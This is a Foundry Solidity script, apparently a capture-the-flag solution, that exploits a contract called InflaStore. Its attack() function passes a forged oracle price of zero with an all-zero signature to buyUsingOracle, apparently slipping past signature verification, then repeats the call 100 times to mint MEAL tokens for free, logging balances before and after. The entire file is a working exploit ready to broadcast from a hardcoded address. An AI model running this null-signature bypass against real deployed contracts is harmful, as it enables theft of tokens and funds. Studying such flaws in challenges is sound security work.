// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
interface IInflaStore {
    function BLOCK_RANGE() external view returns (uint256);

    function MEAL_PRICE() external view returns (uint256);

    function ORACLE_PRICE_TYPEHASH() external view returns (bytes32);

    function buy() external;

    function buyUsingOracle(
        OraclePrice memory oraclePrice,
        Signature memory signature
    ) external;

    function infla() external view returns (address);

    function meal() external view returns (address);

    function setOracle(address _oracle) external;
}

struct OraclePrice {
    uint256 blockNumber;
    uint256 price;
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

contract InflaStoreScript is Script {
    IInflaStore store;
    IERC20 infla;
    IERC721 meal;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        store = IInflaStore(0xC0BD5013ffd1c65967D09317dB6706ed6c300fFe);
        meal = IERC721(0x3f1353c4C496a3478D24fd61fd66dFF38E86e034);
        infla = IERC20(0x065d5343A9B096Ea4abB20B5Cb0C451185ddeBf0);
    }
    function run() public {
        attack();
    }
    function attack() public {           
        uint bal = infla.balanceOf(player);
        console.log("INFLA Balance B4:", bal);

        bal = meal.balanceOf(player);
        console.log("MEAL Balance B4:", bal);

        OraclePrice memory price = OraclePrice({
            blockNumber: block.number - 1,
            price: 0
        });

        Signature memory signature = Signature({
            v: 27,
            r: bytes32(uint256(0)),
            s: bytes32(uint256(0))
        });
                
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        infla.approve(address(store), 10);
        uint numberOfMeals = 100;
        for(uint i; i < numberOfMeals; ++i) {
            store.buyUsingOracle(price, signature);
        }        

        bal = infla.balanceOf(player);
        console.log("INFLA Balance Ar:", bal);

        bal = meal.balanceOf(player);
        console.log("MEAL Balance Ar:", bal);
    }
}